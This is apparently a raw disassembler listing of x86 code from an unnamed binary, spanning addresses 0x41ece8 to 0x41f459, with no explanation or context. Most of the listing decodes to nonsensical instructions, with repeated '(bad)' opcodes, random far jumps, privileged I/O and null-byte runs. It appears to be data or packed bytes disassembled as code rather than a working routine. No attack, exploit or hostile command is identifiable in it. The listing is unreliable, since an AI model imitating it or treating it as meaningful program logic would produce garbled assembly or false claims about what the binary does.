  41ece8:	je     0x41ed5e
  41ecea:	je     0x41ecf3
  41ecec:	das    
  41eced:	xor    eax,0x74747474
  41ecf2:	je     0x41ed68
  41ecf4:	je     0x41ed6a
  41ecf6:	je     0x41ecf8
  41ecf8:	add    BYTE PTR [ebx-0x72c7681e],cl
  41ecfe:	outs   dx,BYTE PTR ds:[esi]
  41ecff:	test   BYTE PTR fs:[ebp-0x1b],0x34
  41ed04:	mov    dh,0x3d
  41ed06:	dec    esp
  41ed07:	fld    QWORD PTR [esp+edi*8+0x6e]
  41ed0b:	mov    ebp,0x4dd3a63c
  41ed10:	nop
  41ed11:	add    BYTE PTR [eax],al
  41ed13:	inc    ebp
  41ed14:	adc    eax,0x81d60000
  41ed19:	add    BYTE PTR [eax],al
  41ed1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed1c:	out    0x40,al
  41ed1e:	xchg   ebp,eax
  41ed1f:	gs test bl,dh
  41ed22:	aaa    
  41ed23:	retf   0xa589
  41ed26:	mov    bl,0xc8
  41ed28:	xchg   ebp,eax
  41ed29:	fisubr WORD PTR [edx]
  41ed2b:	aaa    
  41ed2c:	and    al,0xe2
  41ed2e:	cmp    dl,BYTE PTR [edx+0x54]
  41ed31:	sbb    bh,BYTE PTR [edi]
  41ed33:	add    BYTE PTR [ebx-0x3597aca9],cl
  41ed39:	mov    ecx,DWORD PTR [ebx-0x5d5ad775]
  41ed3f:	pop    eax
  41ed40:	cli    
  41ed41:	(bad)  
  41ed42:	fdiv   DWORD PTR [esi-0x73]
  41ed45:	adc    dl,BYTE PTR [ebx+0x1b864b8f]
  41ed4b:	in     eax,0xc1
  41ed4d:	adc    eax,0x1bba2af2
  41ed52:	addr16 das 
  41ed54:	sbb    BYTE PTR [edi-0x3b],0xb2
  41ed58:	dec    esp
  41ed59:	add    DWORD PTR [esi],edi
  41ed5b:	ins    BYTE PTR es:[edi],dx
  41ed5c:	shl    DWORD PTR [ebp+ebx*1+0x62128b8b],cl
  41ed63:	mov    ecx,DWORD PTR [ebx+0x8b]
  41ed69:	add    BYTE PTR [eax],al
  41ed6b:	add    BYTE PTR [eax],al
  41ed6d:	add    BYTE PTR [eax],al
  41ed6f:	aad    0x92
  41ed71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  41ed7a:	add    BYTE PTR [ebx-0x249eb575],cl
  41ed80:	dec    ecx
  41ed81:	arpl   bx,bp
  41ed83:	jns    0x41eddb
  41ed85:	scas   eax,DWORD PTR es:[edi]
  41ed86:	repz sub eax,DWORD PTR [ecx+0x3fe1c8d3]
  41ed8d:	sub    ebp,edi
  41ed8f:	sti    
  41ed90:	outs   dx,DWORD PTR ds:[esi]
  41ed91:	aad    0x10
  41ed93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed94:	cwde   
  41ed95:	mov    ecx,DWORD PTR [ebx-0x6bbd3667]
  41ed9b:	aam    0x1
  41ed9d:	push   edi
  41ed9e:	jl     0x41ee10
  41eda0:	xchg   BYTE PTR [eax-0x7df6622f],cl
  41eda6:	fs dec esi
  41eda8:	inc    esi
  41eda9:	leave  
  41edaa:	add    DWORD PTR [ecx-0x3bd05307],ebp
  41edb0:	pop    ebx
  41edb1:	xchg   ebp,eax
  41edb2:	or     dh,dh
  41edb4:	mov    ecx,DWORD PTR [ebx-0x74742ef0]
  41edba:	mov    esp,DWORD PTR [ebx]
  41edbc:	xchg   esi,eax
  41edbd:	repz mov eax,DWORD PTR [eax]
  41edc0:	in     eax,dx
  41edc1:	popa   
  41edc2:	add    dh,BYTE PTR [eax]
  41edc4:	fsubr  QWORD PTR [ebx+0x2]
  41edc7:	pop    esp
  41edc8:	pusha  
  41edc9:	in     eax,dx
  41edca:	and    dl,bl
  41edcc:	jnp    0x41edf4
  41edce:	add    al,0xb2
  41edd0:	mov    ecx,esp
  41edd2:	fsubr  st(5),st
  41edd4:	adc    DWORD PTR [ebx+0xab57],edi
  41edda:	add    BYTE PTR [ecx],al
  41eddc:	add    al,BYTE PTR [eax]
  41edde:	add    BYTE PTR [esi+eiz*2],dl
  41ede1:	add    BYTE PTR [eax],al
  41ede3:	add    BYTE PTR [ebp+0x75],dh
  41ede6:	jne    0x41ee5d
  41ede8:	jne    0x41ee5f
  41edea:	jne    0x41ee61
  41edec:	jne    0x41edd7
  41edee:	in     eax,dx
  41edef:	sub    bh,bh
  41edf1:	scas   al,BYTE PTR es:[edi]
  41edf2:	cmp    bh,BYTE PTR [eax-0x17]
  41edf5:	aaa    
  41edf6:	mov    ds:0x98633c0a,al
  41edfb:	xor    BYTE PTR [eax],ch
  41edfd:	mov    BYTE PTR [ebx-0x28a598fc],bh
  41ee03:	dec    edi
  41ee04:	std    
	...
  41ee0d:	add    BYTE PTR [eax],al
  41ee0f:	add    bl,dl
  41ee11:	cmp    DWORD PTR [edx+0x190000d6],ebx
  41ee17:	and    DWORD PTR [edx],0xffffffa0
  41ee1a:	not    ah
  41ee1c:	add    eax,0x1e5824f6
  41ee21:	jmp    0x6a03:0xaebf38f6
  41ee28:	loope  0x41ee47
  41ee2a:	or     eax,edi
  41ee2c:	dec    edi
  41ee2d:	fs cld 
  41ee2f:	nop
  41ee30:	in     al,dx
  41ee31:	cmp    ebx,esp
  41ee33:	add    DWORD PTR [ecx-0x38],edx
  41ee36:	sbb    eax,0x5508
  41ee3b:	js     0x41eebb
  41ee3d:	add    BYTE PTR [eax],al
  41ee3f:	mov    dl,0xc0
  41ee41:	adc    al,BYTE PTR [eax]
  41ee43:	or     dl,bh
  41ee45:	ins    DWORD PTR es:[edi],dx
  41ee46:	fwait
  41ee47:	nop
  41ee48:	int    0x90
  41ee4a:	inc    esi
  41ee4b:	and    eax,0xcab31f2b
  41ee50:	test   eax,0x6f930393
  41ee55:	sbb    al,0x1a
  41ee57:	pop    esp
  41ee58:	jne    0x41edde
  41ee5a:	retf   0x835
  41ee5d:	or     BYTE PTR [eax],cl
  41ee5f:	scas   eax,DWORD PTR es:[edi]
  41ee60:	sub    al,0x56
  41ee62:	jnp    0x41ee05
  41ee64:	popf   
  41ee65:	loop   0x41ee33
  41ee67:	mov    ebx,0x843a647f
  41ee6c:	scas   al,BYTE PTR es:[edi]
  41ee6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee6e:	hlt    
  41ee6f:	sub    dh,BYTE PTR [ecx-0x5c]
  41ee72:	mov    DWORD PTR [esi*8+0x6b3c20e0],edi
  41ee79:	ror    BYTE PTR [eax],cl
  41ee7b:	xchg   DWORD PTR [eax],ecx
  41ee7d:	or     cl,bh
  41ee7f:	out    0x37,al
  41ee81:	or     BYTE PTR [eax],cl
  41ee83:	or     BYTE PTR [ebx-0x74747475],cl
  41ee89:	mov    ecx,DWORD PTR [ebx+0x31008b8b]
  41ee8f:	mov    ch,0xff
  41ee91:	(bad)  
  41ee92:	(bad)  
  41ee93:	(bad)  
  41ee94:	(bad)  
  41ee95:	(bad)  
  41ee96:	(bad)  
  41ee97:	(bad)  
  41ee98:	dec    DWORD PTR [ebp+0x6460e18d]
  41ee9e:	dec    esi
  41ee9f:	and    BYTE PTR [eax+0x77],cl
  41eea2:	sar    BYTE PTR [edi+0x1d],1
  41eea5:	push   ecx
  41eea6:	xlat   BYTE PTR ds:[ebx]
  41eea7:	hlt    
  41eea8:	dec    ebp
  41eea9:	sbb    DWORD PTR [edx+eiz*4-0x470568de],edx
  41eeb0:	in     eax,dx
  41eeb1:	xor    eax,0x858d8dd8
  41eeb6:	nop
  41eeb7:	lea    ecx,[ebp-0x7272200a]
  41eebd:	adc    DWORD PTR [edx+0x580890df],eax
  41eec3:	js     0x41ee9e
  41eec5:	mov    dl,0xc8
  41eec7:	xor    esi,DWORD PTR [edi-0x1f]
  41eeca:	jmp    0x4a17d015
  41eecf:	mov    ch,0xd9
  41eed1:	js     0x41ee81
  41eed3:	cmp    esi,eax
  41eed5:	(bad)  
  41eed6:	jmp    DWORD PTR [eax-0x962fdc]
  41eedc:	(bad)  
  41eedd:	inc    DWORD PTR [ebp+eax*1+0x327bb049]
  41eee4:	pop    ecx
  41eee5:	or     esp,ebx
  41eee7:	test   DWORD PTR [edi-0x44d5dcac],eax
  41eeed:	daa    
  41eeee:	push   es
  41eeef:	test   DWORD PTR [edx],0x93ce4c2f
  41eef5:	ss rcl dh,1
  41eef8:	cli    
  41eef9:	jp     0x41ef23
  41eefb:	inc    ecx
  41eefc:	xchg   DWORD PTR [edi-0x2e],esp
  41eeff:	xchg   ebp,eax
  41ef00:	inc    esi
  41ef01:	(bad)  
  41ef02:	dec    DWORD PTR [ebx]
  41ef04:	enter  0xffff,0xff
  41ef08:	rol    al,0x65
  41ef0b:	outs   dx,DWORD PTR ds:[esi]
  41ef0c:	ins    BYTE PTR es:[edi],dx
  41ef0d:	gs gs cmp al,0x52
  41ef11:	outs   dx,DWORD PTR gs:[esi]
  41ef13:	inc    ecx
  41ef14:	jne    0x41ef84
  41ef16:	popa   
  41ef17:	jo     0x41ef8d
  41ef19:	push   ebx
  41ef1a:	or     eax,0x2252206e
  41ef1f:	imul   ebp,DWORD PTR [ecx+0x77],0x63752e41
  41ef26:	je     0x41ef9b
  41ef28:	gs gs ins DWORD PTR es:[edi],dx
  41ef2b:	addr16 push ebx
  41ef2d:	popa   
  41ef2e:	or     eax,0x76522f2e
  41ef33:	and    esp,DWORD PTR [esi+0x6f]
  41ef36:	jne    0x41efa5
  41ef38:	arpl   WORD PTR [edx],di
  41ef3a:	cs ins WORD PTR es:[edi],dx
  41ef3d:	jo     0x41efa4
  41ef3f:	or     eax,0x2e656163
  41ef44:	outs   dx,DWORD PTR ds:[esi]
  41ef45:	or     eax,0x70207363
  41ef4a:	gs jb  0x41ef91
  41ef4d:	inc    ebx
  41ef4e:	outs   dx,BYTE PTR ds:[esi]
  41ef4f:	ins    DWORD PTR es:[edi],dx
  41ef50:	outs   dx,BYTE PTR fs:[esi]
  41ef52:	dec    ebp
  41ef53:	imul   esi,DWORD PTR [ebp+0x2c],0x20207265
  41ef5a:	inc    ebx
  41ef5b:	arpl   WORD PTR [eax+0xa],di
  41ef5e:	jb     0x41efd6
  41ef60:	and    esp,DWORD PTR [bx+si]
  41ef63:	bound  esp,QWORD PTR [eax]
  41ef65:	push   ebx
  41ef66:	jae    0x41efdb
  41ef68:	inc    ecx
  41ef69:	gs gs jae 0x41efd2
  41ef6d:	inc    ecx
  41ef6e:	gs ins DWORD PTR es:[edi],dx
  41ef70:	outs   dx,BYTE PTR ds:[esi]
  41ef71:	or     eax,0xc0744d41
  41ef76:	rol    al,0xc0
  41ef79:	rol    al,0xc0
  41ef7c:	mov    ebx,esi
  41ef7e:	repz add BYTE PTR [eax],al
  41ef81:	add    BYTE PTR [eax],al
  41ef83:	add    BYTE PTR [eax],al
  41ef85:	add    BYTE PTR [eax],al
  41ef87:	add    BYTE PTR [edi],cl
  41ef89:	rsm    
  41ef8b:	sub    BYTE PTR [ebx-0xfcf3ceb],0x6e
  41ef92:	loop   0x41ef44
  41ef94:	sbb    ebp,DWORD PTR [ecx+0x70]
  41ef97:	adc    DWORD PTR [edi-0x45],eax
  41ef9a:	ret    
  41ef9b:	(bad)  [edi+0x4cf0d87c]
  41efa1:	mov    ds:0xcb3d0f0f,eax
  41efa6:	pop    ebx
  41efa8:	sbb    esi,eax
  41efaa:	(bad)  
  41efab:	jnp    0x41ef5e
  41efad:	sbb    al,0xfa
  41efaf:	mov    ebx,0x9d373396
  41efb4:	icebp  
  41efb5:	adc    eax,0xaff0fb7
  41efba:	shl    DWORD PTR [ebx-0x3e7aa727],1
  41efc0:	pop    edi
  41efc1:	(bad)  
  41efc2:	movups XMMWORD PTR [ebx],xmm3
  41efc5:	hlt    
  41efc6:	(bad)  
  41efc7:	pmaxsw mm0,QWORD PTR [edi+0x55]
  41efcb:	(bad)  
  41efcd:	mov    dh,0x70
  41efcf:	mov    BYTE PTR [edi],bl
  41efd1:	xchg   ebx,eax
  41efd2:	inc    ebp
  41efd3:	xchg   edx,eax
  41efd4:	jns    0x41f01f
  41efd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efd7:	fisttp WORD PTR [edi-0x4b690478]
  41efdd:	(bad)
  41efe0:	pop    ecx
  41efe1:	mov    cl,0xf8
  41efe3:	add    ah,ah
  41efe5:	add    BYTE PTR [eax],al
  41efe7:	add    ch,dh
  41efe9:	adc    BYTE PTR [eax],al
  41efeb:	add    BYTE PTR [edx],bh
  41efed:	add    al,BYTE PTR [eax]
  41efef:	add    BYTE PTR [eax],al
  41eff1:	call   0xe92ad8de
  41eff6:	call   0x6f2ad8e3
  41effb:	fisubr WORD PTR [eax+esi*4-0x1b]
  41efff:	aam    0x37
  41f001:	(bad)  
  41f002:	mov    edx,0xaa1c3798
  41f007:	and    eax,0x664c5c8c
  41f00c:	xor    dh,BYTE PTR [edx-0x14b5167b]
	...
  41f01a:	add    BYTE PTR [ebx+0x18e25e8b],cl
  41f020:	nop
  41f021:	mov    ecx,DWORD PTR [ebx+0x600bceda]
  41f027:	(bad)  
  41f028:	aam    0x83
  41f02a:	inc    edi
  41f02b:	sbb    BYTE PTR [eax+eax*1-0x44],0x64
  41f030:	xor    BYTE PTR [ebp-0x40],0x5
  41f034:	jnp    0x41f0a0
  41f036:	push   ecx
  41f037:	in     eax,dx
  41f038:	cli    
  41f039:	jp     0x41f004
  41f03b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f03c:	add    dl,BYTE PTR [edx-0x398cfbec]
  41f042:	hlt    
  41f043:	sub    eax,0x8b8b598f
  41f048:	mov    bh,0x71
  41f04a:	mov    ecx,DWORD PTR [ebx-0x74808a3e]
  41f050:	add    BYTE PTR [edi-0x56],bl
  41f053:	in     eax,dx
  41f054:	cmovge ebx,edx
  41f057:	in     al,dx
  41f058:	std    
  41f059:	rcr    edx,cl
  41f05b:	pop    ss
  41f05c:	ret    0x6ce3
  41f05f:	addr16 jae 0x41f075
  41f062:	loopne 0x41eff0
  41f064:	pop    ebx
  41f065:	in     eax,0x12
  41f067:	adc    al,0xc6
  41f069:	add    BYTE PTR [eax],al
  41f06b:	add    BYTE PTR [edx-0x14],dh
  41f06e:	in     eax,0x2d
  41f070:	push   0x3e
  41f072:	or     al,cl
  41f074:	je     0x41f0cd
  41f076:	stc    
  41f077:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f078:	inc    DWORD PTR [edx+0x76de2ada]
  41f07e:	stos   DWORD PTR es:[edi],eax
  41f07f:	sbb    BYTE PTR [eax],cl
  41f081:	int    0x71
  41f083:	movnti DWORD PTR [eax],ebp
  41f086:	clc    
  41f087:	cmp    dl,BYTE PTR [esi-0x42f0000]
  41f08d:	push   edi
  41f08e:	add    BYTE PTR [eax],al
  41f090:	add    BYTE PTR [ebx-0x7c7c7c7d],al
  41f096:	add    DWORD PTR [ebx-0x61027c7d],0xffffffb6
  41f09d:	call   0xe92ad98a
  41f0a2:	call   0x2ad98f
  41f0a7:	dec    DWORD PTR [edx]
  41f0a9:	push   es
  41f0aa:	scas   eax,DWORD PTR es:[edi]
  41f0ab:	popa   
  41f0ac:	pop    ebx
  41f0ad:	pushf  
  41f0ae:	push   0x2512e40f
  41f0b3:	inc    edx
  41f0b4:	bound  esi,QWORD PTR [edi+eax*8+0x3b]
  41f0b8:	retf   
  41f0b9:	pop    ecx
  41f0ba:	packssdw mm7,mm4
  41f0bd:	sbb    al,0x11
  41f0bf:	int    0xff
  41f0c1:	dec    DWORD PTR [ebp+0x16]
  41f0c4:	(bad)  
  41f0c5:	dec    esi
  41f0c7:	hlt    
  41f0c8:	(bad)  
  41f0c9:	push   ebx
  41f0cb:	arpl   si,sp
  41f0cd:	fs (bad) 
  41f0cf:	ficom  DWORD PTR [ebx]
  41f0d1:	mov    edi,0xe4c4612
  41f0d6:	stos   BYTE PTR es:[edi],al
  41f0d7:	sub    al,0x97
  41f0d9:	pcmpeqw mm5,mm0
  41f0dc:	stos   DWORD PTR es:[edi],eax
  41f0dd:	jmp    0x41f137
  41f0df:	hlt    
  41f0e0:	pushf  
  41f0e1:	fwait
  41f0e2:	inc    DWORD PTR [eax]
  41f0e4:	jae    0x41f0fe
  41f0e6:	popa   
  41f0e7:	adc    BYTE PTR [eax],al
  41f0e9:	add    BYTE PTR [eax],al
  41f0eb:	repz or eax,0xd677262a
  41f0f1:	pop    esi
  41f0f2:	inc    ecx
  41f0f3:	sbb    eax,DWORD PTR [edx-0x60e08cd9]
  41f0f9:	jns    0x41f103
  41f0fb:	jb     0x41f09a
  41f0fd:	into   
  41f0fe:	loope  0x41f0fd
  41f100:	fisub  WORD PTR [esi+edx*4]
  41f103:	adc    ch,BYTE PTR cs:[eax+0x25]
  41f107:	jle    0x41f170
  41f109:	and    bl,BYTE PTR gs:[esi]
  41f10c:	daa    
  41f10d:	outs   dx,BYTE PTR ds:[esi]
  41f10e:	add    BYTE PTR [eax],al
  41f110:	test   cl,ah
	...
  41f11e:	xchg   edi,eax
  41f11f:	mov    ecx,0xa8
  41f124:	add    BYTE PTR [eax],al
  41f126:	add    BYTE PTR [eax],al
  41f128:	add    BYTE PTR [eax],al
  41f12a:	push   eax
  41f12b:	push   eax
  41f12c:	fild   WORD PTR [edi+0x38]
  41f12f:	fisub  DWORD PTR [edi]
  41f131:	push   ebx
  41f132:	inc    edi
  41f133:	pushf  
  41f134:	outs   dx,DWORD PTR ds:[esi]
  41f135:	push   cs
  41f136:	pushf  
  41f137:	bound  esp,QWORD PTR [ebx+ebp*8]
  41f13a:	addr16 stc 
  41f13c:	stos   DWORD PTR es:[edi],eax
  41f13d:	std    
  41f13e:	retf   
  41f13f:	arpl   WORD PTR [ebx+0x50ec6942],si
  41f145:	push   eax
  41f146:	jmp    0x41f13e
  41f148:	xchg   BYTE PTR [edx],al
  41f14a:	fucomi st,st(2)
  41f14c:	retf   
  41f14d:	scas   eax,DWORD PTR es:[edi]
  41f14e:	lahf   
  41f14f:	pop    edi
  41f150:	adc    ecx,esp
  41f152:	push   cs
  41f153:	imul   ecx,DWORD PTR [eax],0xffffffd5
  41f156:	hlt    
  41f157:	xor    al,0x47
  41f159:	faddp  st(7),st
  41f15b:	jne    0x41f151
  41f15d:	sbb    BYTE PTR ds:0x63045809,bh
  41f163:	push   eax
  41f164:	push   eax
  41f165:	sbb    eax,0x5050a047
  41f16a:	dec    edx
  41f16b:	sub    DWORD PTR [eax],ebx
  41f16d:	push   eax
  41f16e:	add    BYTE PTR ds:0xf65c1612,dl
  41f174:	test   DWORD PTR [edx],esp
  41f176:	out    dx,al
  41f177:	out    dx,eax
  41f178:	icebp  
  41f179:	scas   al,BYTE PTR es:[edi]
  41f17a:	enter  0x580b,0x81
  41f17e:	mov    esi,DWORD PTR [ebx]
  41f180:	dec    esi
  41f181:	mov    ch,0x53
  41f183:	ins    DWORD PTR es:[edi],dx
  41f184:	(bad)  
  41f186:	cwde   
  41f187:	add    BYTE PTR [eax],al
  41f189:	add    BYTE PTR [esp+ebp*1],dh
  41f18c:	add    BYTE PTR [eax],al
  41f18e:	data16 mov BYTE PTR [eax],al
  41f191:	add    BYTE PTR [eax],al
  41f193:	add    al,0x4
  41f195:	add    al,0x4
  41f197:	add    al,0x4
  41f199:	add    al,0x4
  41f19b:	add    al,0xb5
  41f19d:	pop    edx
  41f19e:	(bad)  
  41f1a2:	fcomip st,st(4)
  41f1a4:	add    eax,0x6dbe0624
  41f1a9:	addr16 add eax,0xa4c25da3
  41f1af:	in     eax,0x3c
  41f1b1:	and    al,0xb2
  41f1b3:	popf   
	...
  41f1bc:	add    BYTE PTR [esp],ah
  41f1bf:	ins    BYTE PTR es:[edi],dx
  41f1c0:	mov    ebp,0x2424c76b
  41f1c5:	adc    esi,edi
  41f1c7:	ret    
  41f1c8:	xor    BYTE PTR [eax-0x19],bl
  41f1cb:	(bad)  
  41f1cc:	and    BYTE PTR [ebp+edx*1+0x28645e98],ch
  41f1d3:	xor    bl,al
  41f1d5:	sbb    al,0x45
  41f1d7:	sub    dh,BYTE PTR [ecx-0x1c]
  41f1da:	dec    edx
  41f1db:	in     al,dx
  41f1dc:	xor    bh,0xd0
  41f1df:	jp     0x41f19d
  41f1e1:	jmp    0x601c2bfd
  41f1e6:	or     al,0xd0
  41f1e8:	and    al,0x24
  41f1ea:	xchg   edx,eax
  41f1eb:	jmp    DWORD PTR [esp]
  41f1ee:	inc    eax
  41f1ef:	leave  
  41f1f0:	mov    ds:0x484e0424,eax
  41f1f5:	lahf   
  41f1f6:	xor    DWORD PTR [ecx+ebx*2],0xb59efdb2
  41f1fd:	cli    
  41f1fe:	imul   BYTE PTR [edx]
  41f200:	mov    ebx,0x6918456e
  41f205:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f206:	sar    BYTE PTR [ebx+edi*2],cl
  41f209:	push   edx
  41f20a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f20b:	add    al,0x4
  41f20d:	add    al,0x61
  41f20f:	jecxz  0x41f214
  41f211:	fstp   QWORD PTR [esi]
  41f213:	sbb    al,al
  41f215:	push   es
  41f216:	aaa    
  41f217:	test   edi,ecx
  41f219:	dec    ebx
  41f21a:	jnp    0x41f1cf
  41f21c:	add    esp,DWORD PTR [esi+0x436075d3]
  41f222:	fmul   QWORD PTR [edi-0x7fb81e99]
  41f228:	into   
  41f229:	jae    0x41f259
  41f22b:	add    al,0x4
  41f22d:	inc    edx
  41f22e:	jns    0x41f242
  41f230:	add    al,0x4
  41f232:	add    al,0x74
  41f234:	je     0x41f2aa
  41f236:	je     0x41f2ac
  41f238:	je     0x41f2ae
  41f23a:	je     0x41f2b0
  41f23c:	test   al,0x59
  41f23e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f23f:	(bad)  
  41f240:	(bad)  
  41f241:	(bad)  
  41f242:	(bad)  
  41f243:	(bad)  
  41f244:	(bad)  
  41f245:	(bad)  
  41f246:	(bad)  
  41f247:	push   DWORD PTR [ebx]
  41f249:	xor    edi,DWORD PTR [edx-0x6b]
  41f24c:	xchg   esp,eax
  41f24d:	ror    BYTE PTR [esi],cl
  41f24f:	dec    ebx
  41f250:	shl    DWORD PTR [eax],0xed
  41f253:	repnz nop
  41f255:	je     0x41f24e
  41f257:	dec    esi
  41f258:	pop    ebp
  41f259:	and    al,0xfd
  41f25b:	jbe    0x41f1fe
  41f25d:	mov    ah,0x96
  41f25f:	push   eax
  41f260:	add    al,0xe0
  41f262:	xor    esi,DWORD PTR [ebx]
  41f264:	xchg   ebp,eax
  41f265:	push   edx
  41f266:	xor    esi,DWORD PTR [ebx]
  41f268:	inc    esp
  41f269:	jno    0x41f29e
  41f26b:	xor    esp,DWORD PTR [esi]
  41f26d:	pop    ds
  41f26e:	mov    dl,0x5
  41f270:	aam    0x68
  41f272:	mov    al,0xc9
  41f274:	pop    es
  41f275:	shr    DWORD PTR [esi+eiz*2+0x29e99c9],0xd
  41f27d:	pushf  
  41f27e:	jne    0x41f2d4
  41f280:	popf   
  41f281:	push   eax
  41f282:	ret    0x3385
  41f285:	test   edi,esi
  41f287:	sub    al,0x75
  41f289:	mov    dh,0x85
  41f28b:	test   DWORD PTR [ebp+0x207265d1],eax
  41f291:	jae    0x41f306
  41f293:	jae    0x41f2d9
  41f295:	and    BYTE PTR ds:0x20697473,cl
  41f29b:	and    BYTE PTR [ebp+0x73],ch
  41f29e:	je     0x41f312
  41f2a0:	inc    ebx
  41f2a1:	ins    DWORD PTR es:[edi],dx
  41f2a2:	jae    0x41f2c4
  41f2a4:	jae    0x41f313
  41f2a6:	inc    edx
  41f2a7:	imul   esp,DWORD PTR gs:[ecx+0x73],0x622e4175
  41f2af:	and    BYTE PTR [edx+0x62],dh
  41f2b2:	and    BYTE PTR [edi+0x2e],dl
  41f2b5:	cs je  0x41f31a
  41f2b8:	dec    ebp
  41f2b9:	jae    0x41f331
  41f2bb:	js     0x41f331
  41f2bd:	jae    0x41f2ed
  41f2bf:	and    BYTE PTR [si],bh
  41f2c2:	cmp    eax,0x20206d6d
  41f2c7:	jb     0x41f320
  41f2c9:	bound  esp,QWORD PTR [ecx+0x6e]
  41f2cc:	and    BYTE PTR [ebp+0x6d],ch
  41f2cf:	outs   dx,BYTE PTR ds:[esi]
  41f2d0:	and    BYTE PTR [ebp+eiz*2+0x70],dh
  41f2d4:	or     eax,0x53632066
  41f2d9:	jns    0x41f34d
  41f2db:	inc    edx
  41f2dc:	data16 sub BYTE PTR [edi+0x20],ah
  41f2e0:	gs inc ecx
  41f2e2:	or     eax,0x6d696128
  41f2e7:	jb     0x41f2b6
  41f2e9:	sbb    edi,DWORD PTR [edx+0x37]
  41f2ec:	fidivr WORD PTR [eax+0x103d1d28]
  41f2f2:	shl    BYTE PTR [eax+0xc07eb7e],cl
  41f2f8:	fistp  WORD PTR [esi-0x2f]
  41f2fb:	iret   
  41f2fc:	or     al,0x22
  41f2fe:	js     0x41f2ac
  41f300:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f301:	(bad)  
  41f302:	dec    esp
  41f303:	out    0x18,eax
  41f305:	pop    ebx
  41f306:	add    esp,DWORD PTR [esi]
  41f308:	test   BYTE PTR ds:0xce3d8585,ah
  41f30e:	test   DWORD PTR [ebp-0x3333337b],eax
  41f314:	int3   
  41f315:	int3   
  41f316:	int3   
  41f317:	int3   
  41f318:	int3   
  41f319:	int3   
  41f31a:	xchg   ch,ch
  41f31c:	fiadd  DWORD PTR [eax]
	...
  41f326:	jne    0x41f39d
  41f328:	sub    esp,eax
  41f32a:	mov    al,0x9e
  41f32c:	xor    dh,BYTE PTR [edi+eiz*4-0x1]
  41f330:	cmp    al,cl
  41f332:	mov    fs,WORD PTR [edx+0xda9476e]
  41f338:	loopne 0x41f2c4
  41f33a:	(bad)  
  41f33b:	jb     0x41f30f
  41f33d:	mov    edx,0x75758483
  41f342:	(bad)
  41f346:	sub    eax,0x10b5c2d8
  41f34b:	out    dx,eax
  41f34c:	push   ds
  41f34d:	in     al,0x40
  41f34f:	adc    cl,BYTE PTR [ecx+0x78]
  41f352:	sub    ecx,DWORD PTR [ebx+0x42ec4805]
  41f358:	fbld   TBYTE PTR [ebp+edi*2+0x73f2ed3f]
  41f35f:	jne    0x41f3d6
  41f361:	xchg   ebp,eax
  41f362:	call   0xab76931
  41f367:	jae    0x41f36b
  41f369:	jne    0x41f3b0
  41f36b:	pop    es
  41f36c:	ins    DWORD PTR es:[edi],dx
  41f36d:	mov    eax,ds:0xcc3237f6
  41f372:	fcomp  st(2)
  41f374:	cmp    dh,BYTE PTR [esi+0x3b]
  41f377:	mov    ds:0x2c685d42,eax
  41f37c:	imul   ebx,DWORD PTR [eax],0xc06cfce4
  41f382:	stos   DWORD PTR es:[edi],eax
  41f383:	inc    ebp
  41f384:	inc    ebp
  41f385:	inc    ebp
  41f386:	mov    BYTE PTR [di+0x45],al
  41f38a:	mov    esp,0x454545f8
	...
  41f397:	add    BYTE PTR [ebx+0x6d],ah
  41f39a:	mov    edi,0xd521fce1
  41f39f:	sbb    DWORD PTR [ebx+0x2b1bb81],edi
  41f3a5:	or     DWORD PTR [ebp+0x6c94ce0b],ebx
  41f3ab:	lea    edi,[eax-0x22]
  41f3ae:	sahf   
  41f3af:	pop    esi
	...
  41f3b8:	add    BYTE PTR [ebp+0x45],al
  41f3bb:	sub    DWORD PTR [edx-0x3],edi
  41f3be:	mov    ebp,0x57ee4545
  41f3c3:	mov    ds:0x62f92a0a,al
  41f3c8:	mov    edx,ebx
  41f3ca:	cmc    
  41f3cb:	pushf  
  41f3cc:	sar    esi,0xd7
  41f3cf:	push   eax
  41f3d0:	mov    ch,0x8
  41f3d2:	or     DWORD PTR [esi+0x57],edi
  41f3d5:	cmp    BYTE PTR [ecx],0xd5
  41f3d8:	mov    esp,DWORD PTR [ecx+0x2a]
  41f3db:	icebp  
  41f3dc:	push   es
  41f3dd:	adc    eax,0xdebf71ad
  41f3e2:	ins    DWORD PTR es:[edi],dx
  41f3e3:	aad    0x45
  41f3e5:	inc    ebp
  41f3e6:	call   0x828739dc
  41f3eb:	jecxz  0x41f37c
  41f3ed:	inc    ebp
  41f3ee:	(bad)  
  41f3ef:	fcomp  DWORD PTR [edi+0x22105733]
  41f3f5:	push   ss
  41f3f6:	push   0xffffff90
  41f3f8:	push   0x7d
  41f3fa:	mov    cl,0xb6
  41f3fc:	cs xchg esi,eax
  41f3fe:	std    
  41f3ff:	(bad)  
  41f400:	push   eax
  41f401:	fdivr  QWORD PTR [esi]
  41f403:	sub    ebx,DWORD PTR [ecx-0x90ed]
  41f409:	call   DWORD PTR [ecx-0x6e1dc0ca]
  41f40f:	out    0x7f,al
  41f411:	repz mov ah,0x20
  41f414:	test   al,0x67
  41f416:	add    DWORD PTR [edi],edi
  41f418:	arpl   sp,cx
  41f41a:	sbb    edi,eax
  41f41c:	inc    edi
  41f41d:	cmp    al,0x64
  41f41f:	cmp    DWORD PTR [ebp-0x65],esi
  41f422:	and    al,0xcc
  41f424:	jl     0x41f47c
  41f426:	repz (bad) 
  41f428:	call   DWORD PTR [eax-0x2f9f]
  41f42e:	inc    DWORD PTR [eax]
	...
  41f438:	iret   
  41f439:	cs add al,0x6a
  41f43c:	push   0x6a
  41f43e:	push   0x6a
  41f440:	push   0x6a
  41f442:	push   0x6a
  41f444:	add    BYTE PTR [eax],al
  41f446:	mov    edx,es
  41f448:	ret    
  41f449:	mov    ebx,0xf5806f04
  41f44e:	mov    dl,0x69
  41f450:	mov    WORD PTR [ebx-0x72191a3a],fs
  41f456:	out    0xbc,eax
  41f458:	pop    ebx
  41f459:	hlt    
